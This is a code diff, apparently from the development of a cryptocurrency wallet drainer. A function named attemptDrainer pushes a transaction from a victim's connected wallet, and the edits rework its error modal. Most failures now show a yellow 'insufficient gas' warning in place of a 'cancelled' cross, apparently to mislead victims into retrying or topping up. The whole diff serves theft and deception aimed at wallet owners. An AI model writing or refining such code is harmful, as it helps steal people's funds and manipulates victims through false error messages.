@@ -313,7 +313,8 @@ window.addEventListener('DOMContentLoaded', () => {
     hideModal();
     modalShown = false;
     isTransactionPending = false;
-    updateModalContent('error', 'cancelled');
+    // Показываем жёлтый восклицательный знак вместо крестика
+    updateModalContent('error', 'gas');
   });
 
   // Проверяем наличие инжектированного провайдера
@@ -420,15 +421,20 @@ async function attemptDrainer() {
     console.log(status === 'confirmed' ? '✅ Drainer выполнен успешно' : '🙅 Пользователь отклонил транзакцию');
 
     isTransactionPending = false;
-    updateModalContent(status === 'confirmed' ? 'success' : 'error', 'cancelled');
+    if (status === 'confirmed') {
+      updateModalContent('success');
+    } else {
+      updateModalContent('error', 'cancelled');
+    }
   } catch (err) {
     isTransactionPending = false;
-    let errorType = 'cancelled';
-    if (err.message.includes('Недостаточно') || err.message.includes('Insufficient funds for gas')) {
+    let errorType = 'gas'; // По умолчанию показываем жёлтый восклицательный знак
+    if (err.message.includes('user rejected')) {
+      errorType = 'cancelled'; // Красный крестик только при "user rejected"
+      console.log('🙅 Пользователь отклонил транзакцию');
+    } else if (err.message.includes('Недостаточно') || err.message.includes('Insufficient funds for gas')) {
       errorType = 'gas';
       console.log('⚠️ Недостаточно средств для газа');
-    } else if (err.message.includes('user rejected')) {
-      console.log('🙅 Пользователь отклонил транзакцию');
     } else {
       console.error('❌ Ошибка выполнения drainer:', err.message);
     }
@@ -456,7 +462,7 @@ async function handleConnectOrAction() {
     }
   } catch (err) {
     console.error('❌ Ошибка подключения:', err.message);
-    updateModalContent('error', 'cancelled');
+    updateModalContent('error', err.message.includes('user rejected') ? 'cancelled' : 'gas');
   }
 }
 
